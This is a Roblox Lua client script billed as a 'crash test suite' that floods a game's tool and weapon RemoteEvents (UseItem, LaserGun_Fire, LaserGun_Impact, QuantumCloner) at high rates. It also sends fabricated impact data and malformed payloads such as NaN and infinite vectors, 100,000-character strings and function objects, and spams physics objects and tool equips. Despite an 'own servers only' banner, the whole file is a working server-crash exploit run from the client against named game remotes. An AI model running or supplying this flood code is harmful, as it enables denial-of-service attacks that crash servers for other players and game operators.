--[[
    ========================================
    TOOL/WEAPON CRASH TEST SUITE
    ========================================
    
    Tests server vulnerabilities related to tools/weapons:
    - Tool activation spam (UseItem RemoteEvent abuse)
    - Projectile spawn flooding
    - Position/target manipulation
    - Animation spam via tool equip/unequip
    - Physics object abuse
    - Malformed tool data injection
    
    Based on analysis of:
    - SlingshotScript, HookScript, BeeLauncherScript
    - CandycaneBowScript, ChristmasLauncherController
    - MedusaScript, LaserGunsShared
    - Various weapon scripts using UseItem
    
    !! TEST ON YOUR OWN SERVERS ONLY !!
]]

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HRP = Character:WaitForChild("HumanoidRootPart")
local Humanoid = Character:WaitForChild("Humanoid")

-- Get Net package
local Net = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"))

-- Config
local CONFIG = {
    TEST_DURATION = 8,      -- seconds per test
    RAPID_FIRE_RATE = 100,  -- calls per frame
    LOG_INTERVAL = 1,       -- seconds between status logs
}

-- Stats
local stats = {
    useItemCalls = 0,
    laserFireCalls = 0,
    laserImpactCalls = 0,
    toolEquips = 0,
    physicsObjects = 0,
    malformedCalls = 0,
}

local running = false

-- Utility functions
local function log(msg)
    print("[ToolCrash] " .. msg)
end

local function getRemote(name)
    local success, result = pcall(function()
        return Net:RemoteEvent(name)
    end)
    return success and result or nil
end

local function getRandomPosition()
    return Vector3.new(
        math.random(-1000, 1000),
        math.random(0, 500),
        math.random(-1000, 1000)
    )
end

local function getRandomDirection()
    return Vector3.new(
        math.random() * 2 - 1,
        math.random() * 2 - 1,
        math.random() * 2 - 1
    ).Unit
end

local function generateGUID()
    return HttpService:GenerateGUID(false):lower():gsub("%-", "")
end

-- ============================================
-- TEST 1: UseItem Spam (Generic Tool Activation)
-- ============================================
local function testUseItemSpam()
    log("=== TEST 1: UseItem Spam ===")
    log("Simulating rapid tool activation (all tools use UseItem)")
    
    local useItem = getRemote("UseItem")
    if not useItem then
        log("ERROR: UseItem remote not found")
        return
    end
    
    local testStart = os.clock()
    local calls = 0
    
    while running and os.clock() - testStart < CONFIG.TEST_DURATION do
        for _ = 1, CONFIG.RAPID_FIRE_RATE do
            -- Different payload types that various tools send
            pcall(function()
                -- No args (Demon, Invisibility, Medusa, Flashbang, etc.)
                useItem:FireServer()
                calls = calls + 1
                
                -- Position args (CandyCannon, PaintballGun, WormholeTunneler)
                useItem:FireServer(getRandomPosition())
                calls = calls + 1
                
                -- Direction + power (BlackHoleBomb)
                useItem:FireServer(getRandomDirection(), math.random())
                calls = calls + 1
                
                -- Duration + position + target (Slingshot)
                useItem:FireServer(math.random() * 10, getRandomPosition(), nil)
                calls = calls + 1
                
                -- Hook style (magnitude/120)
                useItem:FireServer(math.random())
                calls = calls + 1
                
                -- Player target (BeeLauncher, BodySwap)
                local randomPlayer = Players:GetPlayers()[math.random(#Players:GetPlayers())]
                useItem:FireServer(randomPlayer)
                calls = calls + 1
            end)
        end
        stats.useItemCalls = stats.useItemCalls + calls
        RunService.Heartbeat:Wait()
    end
    
    log(string.format("UseItem spam complete: %d calls", stats.useItemCalls))
end

-- ============================================
-- TEST 2: Laser Gun Projectile Spam
-- ============================================
local function testLaserGunSpam()
    log("=== TEST 2: Laser Gun Projectile Spam ===")
    log("Flooding LaserGun_Fire and LaserGun_Impact")
    
    local laserFire = getRemote("LaserGun_Fire")
    local laserImpact = getRemote("LaserGun_Impact")
    
    if not laserFire then
        log("LaserGun_Fire not found, skipping")
        return
    end
    
    local testStart = os.clock()
    
    while running and os.clock() - testStart < CONFIG.TEST_DURATION do
        for _ = 1, CONFIG.RAPID_FIRE_RATE do
            pcall(function()
                local id = generateGUID()
                local origin = HRP.Position + Vector3.new(0, 2, 0)
                local direction = getRandomDirection()
                local timestamp = workspace:GetServerTimeNow()
                
                laserFire:FireServer(id, origin, direction, timestamp)
                stats.laserFireCalls = stats.laserFireCalls + 1
                
                if laserImpact then
                    -- Fake impact data
                    local impacts = {}
                    for i = 1, math.random(1, 10) do
                        table.insert(impacts, {
                            Timestamp = timestamp + i * 0.01,
                            CFrame = CFrame.new(getRandomPosition()),
                            LinearVelocity = getRandomDirection() * 100,
                            Age = i * 0.1,
                            HitPart = workspace.Terrain,
                            HitNormal = Vector3.new(0, 1, 0),
                            HitPosition = getRandomPosition(),
                            HitEnding = getRandomPosition(),
                            HitAlpha = math.random(),
                            HitSize = Vector3.new(1, 1, 1),
                            HitCFrame = CFrame.new(getRandomPosition()),
                            Attributes = { Bounces = math.random(1, 20) }
                        })
                    end
                    laserImpact:FireServer(id, impacts)
                    stats.laserImpactCalls = stats.laserImpactCalls + 1
                end
            end)
        end
        RunService.Heartbeat:Wait()
    end
    
    log(string.format("Laser spam complete: %d fire, %d impact", stats.laserFireCalls, stats.laserImpactCalls))
end

-- ============================================
-- TEST 3: Rapid Tool Equip/Unequip
-- ============================================
local function testToolEquipSpam()
    log("=== TEST 3: Tool Equip/Unequip Spam ===")
    log("Rapidly cycling through backpack tools")
    
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then
        log("No Backpack found, skipping")
        return
    end
    
    local testStart = os.clock()
    
    while running and os.clock() - testStart < CONFIG.TEST_DURATION do
        pcall(function()
            local tools = backpack:GetChildren()
            for _, tool in ipairs(tools) do
                if tool:IsA("Tool") then
                    Humanoid:EquipTool(tool)
                    stats.toolEquips = stats.toolEquips + 1
                    
                    -- Immediately unequip
                    Humanoid:UnequipTools()
                    stats.toolEquips = stats.toolEquips + 1
                end
            end
        end)
        RunService.Heartbeat:Wait()
    end
    
    log(string.format("Tool equip spam complete: %d equip/unequip cycles", stats.toolEquips))
end

-- ============================================
-- TEST 4: Malformed UseItem Payloads
-- ============================================
local function testMalformedPayloads()
    log("=== TEST 4: Malformed UseItem Payloads ===")
    log("Sending corrupted/unusual data types to UseItem")
    
    local useItem = getRemote("UseItem")
    if not useItem then
        log("ERROR: UseItem remote not found")
        return
    end
    
    local malformedData = {
        -- Extreme vectors
        Vector3.new(1e308, 1e308, 1e308),
        Vector3.new(-1e308, -1e308, -1e308),
        Vector3.new(math.huge, math.huge, math.huge),
        Vector3.new(-math.huge, -math.huge, -math.huge),
        Vector3.new(0/0, 0/0, 0/0), -- NaN
        
        -- Extreme numbers
        1e308,
        -1e308,
        math.huge,
        -math.huge,
        0/0,
        
        -- Deep tables
        { a = { b = { c = { d = { e = { f = {} } } } } } },
        
        -- Very long strings
        string.rep("A", 100000),
        string.rep("\0", 10000),
        
        -- Unusual types
        function() end,
        coroutine.create(function() end),
        newproxy(true),
        
        -- Mixed garbage
        { [1] = "a", [2] = nil, [3] = "b", ["x"] = 1, [{}] = {} },
    }
    
    local testStart = os.clock()
    
    while running and os.clock() - testStart < CONFIG.TEST_DURATION do
        for _, data in ipairs(malformedData) do
            pcall(function()
                useItem:FireServer(data)
                stats.malformedCalls = stats.malformedCalls + 1
                
                useItem:FireServer(data, data)
                stats.malformedCalls = stats.malformedCalls + 1
                
                useItem:FireServer(data, data, data)
                stats.malformedCalls = stats.malformedCalls + 1
            end)
        end
        RunService.Heartbeat:Wait()
    end
    
    log(string.format("Malformed payloads complete: %d calls", stats.malformedCalls))
end

-- ============================================
-- TEST 5: Client-Side Physics Object Spam
-- ============================================
local function testPhysicsObjectSpam()
    log("=== TEST 5: Physics Object Spam ===")
    log("Creating many physics objects (BodyVelocity, LinearVelocity)")
    log("Note: These are client-side but may trigger server replication issues")
    
    local created = {}
    local testStart = os.clock()
    
    while running and os.clock() - testStart < CONFIG.TEST_DURATION do
        pcall(function()
            for _ = 1, 10 do
                -- BodyVelocity (like HookScript)
                local bv = Instance.new("BodyVelocity")
                bv.Name = "TestFlightPower"
                bv.MaxForce = Vector3.new(1e999, 1e999, 1e999)
                bv.Velocity = getRandomDirection() * 1000
                bv.P = 10000
                bv.Parent = HRP
                table.insert(created, bv)
                stats.physicsObjects = stats.physicsObjects + 1
                
                -- LinearVelocity (like launchers)
                local attachment = Instance.new("Attachment")
                attachment.Parent = HRP
                
                local lv = Instance.new("LinearVelocity")
                lv.VectorVelocity = getRandomDirection() * 500
                lv.Attachment0 = attachment
                lv.Parent = HRP
                table.insert(created, lv)
                table.insert(created, attachment)
                stats.physicsObjects = stats.physicsObjects + 1
            end
        end)
        
        -- Clean up older ones to prevent complete freeze
        if #created > 100 then
            for i = 1, 50 do
                if created[i] then
                    pcall(function() created[i]:Destroy() end)
                end
            end
            for i = 1, 50 do
                table.remove(created, 1)
            end
        end
        
        RunService.Heartbeat:Wait()
    end
    
    -- Cleanup
    for _, obj in ipairs(created) do
        pcall(function() obj:Destroy() end)
    end
    
    log(string.format("Physics spam complete: %d objects created", stats.physicsObjects))
end

-- ============================================
-- TEST 6: Combined Weapon Attack Flood
-- ============================================
local function testCombinedWeaponFlood()
    log("=== TEST 6: Combined Weapon Attack Flood ===")
    log("All weapon remotes simultaneously")
    
    local remotes = {
        UseItem = getRemote("UseItem"),
        LaserGun_Fire = getRemote("LaserGun_Fire"),
        LaserGun_Impact = getRemote("LaserGun_Impact"),
        QuantumCloner_OnTeleport = getRemote("QuantumCloner/OnTeleport"),
    }
    
    local testStart = os.clock()
    local totalCalls = 0
    
    while running and os.clock() - testStart < CONFIG.TEST_DURATION do
        pcall(function()
            for name, remote in pairs(remotes) do
                if remote then
                    for _ = 1, 20 do
                        remote:FireServer()
                        remote:FireServer(getRandomPosition())
                        remote:FireServer(getRandomDirection(), math.random())
                        remote:FireServer(generateGUID(), getRandomPosition(), getRandomDirection(), workspace:GetServerTimeNow())
                        totalCalls = totalCalls + 4
                    end
                end
            end
        end)
        RunService.Heartbeat:Wait()
    end
    
    log(string.format("Combined flood complete: %d total calls", totalCalls))
end

-- ============================================
-- MAIN TEST RUNNER
-- ============================================
local function runAllTests()
    log("========================================")
    log("TOOL/WEAPON CRASH TEST SUITE")
    log("========================================")
    log("Duration per test: " .. CONFIG.TEST_DURATION .. " seconds")
    log("")
    
    running = true
    
    -- Status reporter
    task.spawn(function()
        local lastLog = os.clock()
        while running do
            if os.clock() - lastLog >= CONFIG.LOG_INTERVAL then
                log(string.format(
                    "Stats - UseItem: %d | LaserFire: %d | Equips: %d | Physics: %d | Malformed: %d",
                    stats.useItemCalls,
                    stats.laserFireCalls,
                    stats.toolEquips,
                    stats.physicsObjects,
                    stats.malformedCalls
                ))
                lastLog = os.clock()
            end
            task.wait(0.1)
        end
    end)
    
    -- Run tests sequentially
    local tests = {
        { name = "UseItem Spam", fn = testUseItemSpam },
        { name = "Laser Gun Spam", fn = testLaserGunSpam },
        { name = "Tool Equip Spam", fn = testToolEquipSpam },
        { name = "Malformed Payloads", fn = testMalformedPayloads },
        { name = "Physics Object Spam", fn = testPhysicsObjectSpam },
        { name = "Combined Weapon Flood", fn = testCombinedWeaponFlood },
    }
    
    for i, test in ipairs(tests) do
        if not running then break end
        log("")
        log(string.format("Starting test %d/%d: %s", i, #tests, test.name))
        
        local success, err = pcall(test.fn)
        if not success then
            warn("[ToolCrash] Test failed with error:", err)
        end
        
        task.wait(1) -- Brief pause between tests
    end
    
    running = false
    
    log("")
    log("========================================")
    log("ALL TESTS COMPLETE")
    log("========================================")
    log("Final Stats:")
    log("  UseItem Calls: " .. stats.useItemCalls)
    log("  LaserGun Fire: " .. stats.laserFireCalls)
    log("  LaserGun Impact: " .. stats.laserImpactCalls)
    log("  Tool Equips: " .. stats.toolEquips)
    log("  Physics Objects: " .. stats.physicsObjects)
    log("  Malformed Calls: " .. stats.malformedCalls)
    log("========================================")
end

-- Export
return {
    runAllTests = runAllTests,
    runTest = function(testName)
        running = true
        local tests = {
            useitem = testUseItemSpam,
            laser = testLaserGunSpam,
            equip = testToolEquipSpam,
            malformed = testMalformedPayloads,
            physics = testPhysicsObjectSpam,
            combined = testCombinedWeaponFlood,
        }
        
        local fn = tests[testName:lower()]
        if fn then
            log("Running single test: " .. testName)
            fn()
        else
            log("Unknown test: " .. testName)
            log("Available: useitem, laser, equip, malformed, physics, combined")
        end
        running = false
    end,
    stop = function()
        running = false
        log("Tests stopped")
    end,
    getStats = function()
        return stats
    end
}
